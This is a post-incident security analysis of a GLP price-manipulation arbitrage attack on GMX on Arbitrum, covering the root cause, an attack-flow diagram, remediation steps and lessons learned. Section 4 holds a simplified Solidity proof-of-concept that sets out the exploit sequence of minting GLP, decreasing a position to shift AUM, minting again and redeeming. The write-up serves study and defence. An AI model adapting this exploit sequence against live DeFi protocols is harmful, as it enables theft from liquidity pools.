# GMX — Arbitrage Attack via GLP Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-10 |
| **Protocol** | GMX (GLP) |
| **Chain** | Arbitrum |
| **Loss** | Mid-scale (exact amount undisclosed) |
| **Attacker** | Under analysis |
| **Attack Tx** | Arbitrum network |
| **Vulnerable Contract** | GMX GLP Manager |
| **Root Cause** | Price used in AUM calculation during GLP mint/redeem process is manipulable |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/gmx_exp.sol) |

---

## 1. Vulnerability Overview

GMX's GLP pool issues GLP tokens backed by multiple assets as collateral. The GLP price is determined by dividing the pool's AUM (Assets Under Management) by the total GLP supply. The attacker combined GMX's decreasePosition mechanism with GLP mint/redeem to temporarily distort the AUM calculation, exploiting the GLP price differential for arbitrage profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: GLP price calculated as instantaneous AUM/supply
interface IRewardRouterV2 {
    function mintAndStakeGlp(
        address _token,
        uint256 _amount,
        uint256 _minUsdg,
        uint256 _minGlp
    ) external returns (uint256);

    function unstakeAndRedeemGlp(
        address _tokenOut,
        uint256 _glpAmount,
        uint256 _minOut,
        address _receiver
    ) external returns (uint256);
}

// GLP price = AUM / totalSupply
// By exploiting the moment AUM shifts due to position decrease,
// it is possible to mint at a low price and redeem at a high price

// ✅ Fix: Apply a cooldown period to GLP mint/redeem
mapping(address => uint256) public lastMintTime;
uint256 public constant COOLDOWN = 15 minutes;

function mintAndStakeGlp(...) external returns (uint256) {
    require(block.timestamp >= lastMintTime[msg.sender] + COOLDOWN, "Cooldown active");
    lastMintTime[msg.sender] = block.timestamp;
    ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ GMX: mintAndStakeGlp(USDC → GLP)
  │         └─ GLP issued based on current AUM
  │
  ├─2─▶ GMX PositionRouter: createDecreasePosition()
  │         └─ Induce AUM shift via position decrease
  │
  ├─3─▶ executeDecreasePositions() executed
  │         └─ Temporary AUM decrease → GLP price drops
  │
  ├─4─▶ GMX: mintAndStakeGlp (acquire additional GLP at lower price)
  │
  ├─5─▶ AUM normalizes → GLP price recovers
  │
  └─6─▶ unstakeAndRedeemGlp → redeem at higher price, realize arbitrage profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// GMX GLP price manipulation core flow
function testExploit() public {
    // Step 1: Initial GLP purchase
    uint256 glpAmount = rewardRouter.mintAndStakeGlp(
        address(usdc),
        initialAmount,
        0,       // minUsdg
        0        // minGlp
    );

    // Step 2: Execute position decrease to manipulate AUM
    bytes32 requestKey = positionRouter.createDecreasePosition{value: executionFee}(
        path,
        indexToken,
        collateralDelta,
        sizeDelta,
        isLong,
        address(this),
        acceptablePrice,
        0,
        executionFee,
        false,
        address(0)
    );

    // Step 3: Immediately execute position (AUM shifts)
    positionRouter.executeDecreasePositions(type(uint256).max, payable(address(this)));

    // Step 4: Buy additional GLP at depressed price, then redeem
    uint256 moreGlp = rewardRouter.mintAndStakeGlp(address(usdc), moreAmount, 0, 0);
    rewardRouter.unstakeAndRedeemGlp(address(usdc), glpAmount + moreGlp, 0, address(this));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | GLP price calculation relies on instantaneous AUM that can be shifted via position manipulation (no mint/redeem cooldown) |
| **Attack Vector** | GLP AUM distortion through position manipulation |
| **Impact Scope** | Entire GLP pool |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Price Manipulation |

## 6. Remediation Recommendations

1. **Cooldown Period**: Disallow redeem for at least 15 minutes after GLP mint
2. **AUM Snapshot**: Protect GLP pricing based on AUM delta immediately before/after position changes
3. **Max Mint/Redeem Limit**: Cap GLP transaction amounts within a single transaction
4. **Position–GLP Separation**: Prohibit position execution and GLP mint/redeem within the same transaction

## 7. Lessons Learned

- Complex DeFi protocols like GMX are susceptible to cross-feature vulnerabilities when multiple functions (position trading + liquidity provision) share the same price feed.
- Pool-based pricing models like GLP are vulnerable to instantaneous AUM fluctuations caused by position manipulation.
- Cooldown/lockup periods are a simple yet effective countermeasure against manipulation.